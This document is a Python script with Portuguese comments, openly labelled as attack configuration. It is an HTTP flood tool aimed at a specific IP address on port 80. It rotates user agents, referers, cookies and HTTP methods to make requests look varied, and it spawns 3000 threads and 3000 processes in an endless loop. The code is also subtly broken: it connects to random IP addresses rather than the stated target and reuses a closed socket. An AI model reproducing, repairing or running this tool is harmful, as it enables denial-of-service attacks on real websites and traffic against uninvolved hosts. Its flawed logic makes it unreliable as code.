import socket
import threading
import multiprocessing
import random
import string
import requests
import base64
import hashlib

# Configurações do ataque
target_ip = "177.153.49.2"  # IP do site alvo
target_port = 80  # Porta HTTP padrão

# Lendo User Agents do arquivo "useragents.txt"
with open("useragents.txt", "r") as file:
    user_agents = file.read().splitlines()

# Lendo Referers do arquivo "referers.txt"
with open("referers.txt", "r") as file:
    referers = file.read().splitlines()

# Lista de Cookies
cookies = [
    "session=abcdef123456789",
    "user_id=12345",
    # Adicione mais Cookies aqui
]

# Lista de Métodos HTTP
http_methods = [
    "GET",
    "POST",
    "PUT",
    "DELETE",
    # Adicione mais Métodos HTTP aqui
]

# Função para gerar IP aleatório
def get_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Função para gerar Cookie aleatório
def get_random_cookie():
    return random.choice(cookies)

# Função para gerar Método HTTP aleatório
def get_random_http_method():
    return random.choice(http_methods)

# Função para enviar mensagens HTTP
def send_http_request():
    # Criação do socket TCP
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        ip = get_random_ip()
        user_agent = random.choice(user_agents)
        referer = random.choice(referers)
        cookie = get_random_cookie()
        http_method = get_random_http_method()
        
        headers = f"{http_method} / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: {user_agent}\r\nReferer: {referer}\r\nCookie: {cookie}\r\nConnection: keep-alive\r\n\r\n"
        try:
            sock.connect((ip, target_port))
            sock.sendall(headers.encode())
        except Exception as e:
            pass
        finally:
            sock.close()

# Criando Threads
threads = []
for _ in range(3000):  # Criando 3000 threads
    thread = threading.Thread(target=send_http_request)
    thread.daemon = True
    thread.start()
    threads.append(thread)

# Criando Processos
processes = []
for _ in range(3000):  # Criando 3000 processos
    process = multiprocessing.Process(target=send_http_request)
    process.daemon = True
    process.start()
    processes.append(process)

# Mantendo os processos e threads em loop infinito
while True:
    for thread in threads:
        if not thread.is_alive():
            thread = threading.Thread(target=send_http_request)
            thread.daemon = True
            thread.start()

    for process in processes:
        if not process.is_alive():
            process = multiprocessing.Process(target=send_http_request)
            process.daemon = True
            process.start()